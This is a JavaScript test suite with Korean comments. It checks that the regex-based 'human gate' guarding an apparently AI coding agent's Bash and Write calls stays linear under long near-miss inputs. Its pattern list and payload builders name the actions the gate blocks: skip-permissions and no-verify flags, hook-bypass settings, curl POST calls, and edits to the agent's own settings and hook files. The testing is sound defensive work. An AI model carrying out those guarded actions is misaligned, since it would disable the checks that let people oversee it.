  it('스캐너 자기검증 — 주석 속 언급은 잡지 않고, 주석 뒤 코드는 잡는다', () => {
    expect(scanPurity('/* process.env */ const x = 1;\n// new Date()\nconst y = 2;')).toEqual([]);
    expect(scanPurity('// process.env\nconst x = process.cwd();')).toEqual(['process.']);
    expect(scanPurity("const u = 'http://x'; const d = new Date();")).toEqual(['Date']);
  });
});

// ── ReDoS: 긴 단일 런 스윕 ─────────────────────────────────────────────────
// 정규식마다 근접-미스 payload(매치하지 않는 형)를 20,480·40,960·122,880B 로 키운다. 핵심
// 단언은 구조(스캐너 0건)와 종료·결과(false)이고, 벽시계는 6배 구간 성장비(바닥값 4ms)와
// 느슨한 절대 상한만 둔다. 헬퍼는 tests/security/human-gates.test.js 와 **형식만** 같은
// 자급형 복사본이다(테스트 파일끼리 import 하지 않는다).

/** 반복 단위로 정확히 bytes 길이의 payload. @param {string} unit @param {number} bytes */
function fill(unit, bytes) {
  return unit.repeat(Math.ceil(bytes / unit.length)).slice(0, bytes);
}

/** fn 을 runs 회 돌린 경과 시간의 중앙값(ms). @param {() => void} fn @param {number} runs */
function medianMs(fn, runs) {
  const samples = [];
  for (let i = 0; i < runs; i += 1) {
    const started = performance.now();
    fn();
    samples.push(performance.now() - started);
  }
  samples.sort((a, b) => a - b);
  return samples[Math.floor(runs / 2)];
}

/** 성장 게이트의 바닥값(ms). 빠르고 선형인 규칙에서 생 비율이 튀는 것을 막는다. */
const RATIO_FLOOR_MS = 4;

/** 6배 구간 성장 비율. @param {number} numerator @param {number} denominator */
function growth(numerator, denominator) {
  return (numerator + RATIO_FLOOR_MS) / (denominator + RATIO_FLOOR_MS);
}

/**
 * 길이를 그대로 둔 채 회차 표식을 **꼬리에** 박는다(V8 의 같은 (regex, string) 결과 캐시 회피).
 * human-gates.test.js 는 머리에 박지만, 여기서는 머리 단어(`bypassPreCommitHooks`)와 `^` 앵커
 * 시작 위치를 보존해야 2차식 형이 살아 있으므로 꼬리다. 표식은 슬래시·별표 형이 아니라 `#i#` —
 * 슬래시 표식이 `a:/` 필러 꼬리와 붙어 `://` 를 만들어 URL_AUTHORITY 를 매치시켰다(실측 RED).
 * @param {(n: number) => string} build @param {number} n @param {number} i
 */
function tagged(build, n, i) {
  const tag = `#${i}#`;
  return build(n).slice(0, n - tag.length) + tag;
}

/**
 * 머리 표식 — 보호 basename 이 꼬리에 있어야 하는 경로 payload 용(꼬리 표식은 basename 을 깬다).
 * @param {(n: number) => string} build @param {number} n @param {number} i
 */
function headTagged(build, n, i) {
  const tag = `#${i}#`;
  return tag + build(n).slice(tag.length);
}

/** build 를 회차마다 다른 payload 로 3회 돌린 median(ms). payload 는 측정 밖에서 만든다. */
function medianOverTagged(run, build, n) {
  const payloads = [0, 1, 2].map((i) => tagged(build, n, i));
  let cursor = 0;
  return medianMs(() => {
    run(payloads[cursor]);
    cursor += 1;
  }, payloads.length);
}

const SIZES = [20_480, 40_960, 122_880];

/** 패턴 id → 근접-미스 payload 빌더들. */
const NEAR_MISS_BUILDERS = Object.freeze({
  BASH_HG12_PATH: [(n) => fill('.claude/', n)],
  BASH_HG13_PATH: [(n) => fill('.claude/', n), (n) => fill('.claude/artibot.config.jso ', n)],
  SKIP_PERMISSIONS_FLAG: [(n) => fill('--dangerously-skip-permission ', n)],
  NO_VERIFY_FLAG: [(n) => fill('--no-verif ', n)],
  BYPASS_HOOKS_TRUE: [
    (n) => fill('bypassPrePushHooks: tru ', n),
    (n) => `bypassPreCommitHooks${' '.repeat(n - 21)}x`,
  ],
  SHELL_CHAIN_META: [(n) => fill('ab ', n)],
  TOKEN_SEPARATOR: [(n) => fill('ab', n)],
  WHITESPACE: [(n) => fill('ab', n)],
  URL_AUTHORITY: [(n) => fill('x', n), (n) => fill('a:/', n)],
  BARE_HOST: [(n) => fill('a.', n), (n) => fill('a', n)],
  BARE_IPV6_HOST: [(n) => `[${fill(':', n - 1)}`],
  IPV4_LOOPBACK: [(n) => fill('127.', n)],
});

/** decideHumanGate 전체 경로 payload — HG-13[2] 원본 2차식 형(regex-scan.js 카탈로그 (vi))을 포함한다. */
const END_TO_END_BUILDERS = Object.freeze({
  'HG-13[2] 원본 2차식 형: bypassPreCommitHooks + 공백×n': (n) => `bypassPreCommitHooks${' '.repeat(n - 21)}x`,
  '.claude/ 반복': (n) => fill('.claude/', n),
  'curl -X POST 반복': (n) => fill('curl -X POST ', n),
  '--no-verif 반복': (n) => fill('--no-verif ', n),
  'loopback URL 반복': (n) => fill('http://127.0.0.1 ', n),
  '도메인 모양 토큰 반복': (n) => fill('a.b ', n),
  '.claude/worktrees/ 반복': (n) => fill('.claude/worktrees/x', n),
  // 세그먼트 수 최대화 필러 — 2026-09-28 toPathSegments reduce+spread 2차식의 재현 형
  // (redos 팀원 실측 isClaudeConfigPath fill('a://') 122,880B 4,570.7ms).
  'a:// 단일 토큰': (n) => fill('a://', n),
  'curl -X POST + a:// 단일 토큰': (n) => `curl -X POST ${fill('a://', n - 13)}`,
  '../ 단일 토큰': (n) => fill('../', n),
  'a/ 단일 토큰': (n) => fill('a/', n),
});

/** 보호 basename 을 꼬리에 둔 경로 payload(머리 표식) — 술어가 끝까지 도는 형. */
const PATH_BUILDERS = Object.freeze({
  'a:// + settings.json': (n) => `${fill('a://', n - 13)}settings.json`,
  '../ + .claude/settings.json': (n) => `${fill('../', n - 21)}.claude/settings.json`,
  'a/ + artibot.config.json': (n) => `${fill('a/', n - 19)}artibot.config.json`,
  '.claude/worktrees/x/ + hooks.json': (n) => `${fill('.claude/worktrees/x/', n - 10)}hooks.json`,
  '백슬래시 a\\ + dispatch-table.json': (n) => `${fill('a\\', n - 19)}dispatch-table.json`,
});

describe('ReDoS — 새 정규식 구조 스캔과 긴 단일 런 스윕', () => {
  const patternIds = ENFORCE_PATTERNS.map((entry) => entry.id);
  const patternOf = (id) => ENFORCE_PATTERNS.find((entry) => entry.id === id).pattern;

  it('ENFORCE_PATTERNS 는 동결 배열이고 항목마다 고정 id + RegExp 다', () => {
    expect(Object.isFrozen(ENFORCE_PATTERNS)).toBe(true);
    expect(new Set(patternIds).size).toBe(patternIds.length);
    for (const entry of ENFORCE_PATTERNS) {
      expect(Object.isFrozen(entry)).toBe(true);
      expect(Object.keys(entry)).toEqual(['id', 'pattern']);
      expect(entry.pattern).toBeInstanceOf(RegExp);
    }
  });

  it('모든 패턴에 근접-미스 빌더가 등록돼 있다 (새 패턴이 스윕을 빠져나가지 못한다)', () => {
    expect(Object.keys(NEAR_MISS_BUILDERS).sort()).toEqual([...patternIds].sort());
  });

  it('빌더는 주장한 바이트 수를 정확히 만들고 회차 표식이 payload 를 바꾼다', () => {
    for (const build of [...Object.values(NEAR_MISS_BUILDERS).flat(), ...Object.values(END_TO_END_BUILDERS)]) {
      expect(build(20_480)).toHaveLength(20_480);
      expect(tagged(build, 20_480, 0)).toHaveLength(20_480);
      expect(tagged(build, 20_480, 0)).not.toBe(tagged(build, 20_480, 1));
    }
  });

  it.each(patternIds)('%s — 창 192 초과 무제한 런 0건 (findUnboundedRuns), g·y 플래그 없음', (id) => {
    const re = patternOf(id);
    expect(re.global).toBe(false);
    expect(re.sticky).toBe(false);
    expect(findUnboundedRuns(re.source, re.flags)).toEqual([]);
  });

  it.each(patternIds)('%s — 20KB/40KB/120KB 근접-미스에서 종료·불일치, 6배 성장비 < 18', (id) => {
    const re = patternOf(id);
    for (const build of NEAR_MISS_BUILDERS[id]) {
      for (const n of SIZES) expect(re.test(tagged(build, n, 9))).toBe(false);
      const [t20480, , t122880] = SIZES.map((n) => medianOverTagged((s) => re.test(s), build, n));
      expect(t122880).toBeLessThan(1500);
      expect(growth(t122880, t20480)).toBeLessThan(18);
    }
  });

  it.each(Object.keys(END_TO_END_BUILDERS))('decideHumanGate 전체 경로 — %s: 종료, 어휘 안 결정, 6배 성장비 < 18', (label) => {
    const build = END_TO_END_BUILDERS[label];
    const run = (command) => decide({ tool: 'Bash', command });
    expect(ENFORCE_DECISIONS).toContain(run(tagged(build, 122_880, 9)).decision);
    const [t20480, , t122880] = SIZES.map((n) => medianOverTagged(run, build, n));
    expect(t122880).toBeLessThan(3000);
    expect(growth(t122880, t20480)).toBeLessThan(18);
  });

  /** 머리 표식 payload 로 3회 median(ms). */
  const medianOverHeadTagged = (run, build, n) => {
    const payloads = [0, 1, 2].map((i) => headTagged(build, n, i));
    let cursor = 0;
    return medianMs(() => {
      run(payloads[cursor]);
      cursor += 1;
    }, payloads.length);
  };

  it.each(Object.keys(PATH_BUILDERS))('경로 술어·Write/Edit 경로 — %s: 선형(6배 성장비 < 18)', (label) => {
    const build = PATH_BUILDERS[label];
    expect(build(20_480)).toHaveLength(20_480);
    const runs = [
      (p) => isClaudeConfigPath(p, { pluginRoot: CACHE_ROOT }),
      (p) => decide({ tool: 'Write', path: p }),
      (p) => decide({ tool: 'Bash', command: `cp x ${p}` }),
    ];
    for (const run of runs) {
      const [t20480, , t122880] = SIZES.map((n) => medianOverHeadTagged(run, build, n));
      expect(t122880).toBeLessThan(3000);
      expect(growth(t122880, t20480)).toBeLessThan(18);
    }
  });
});
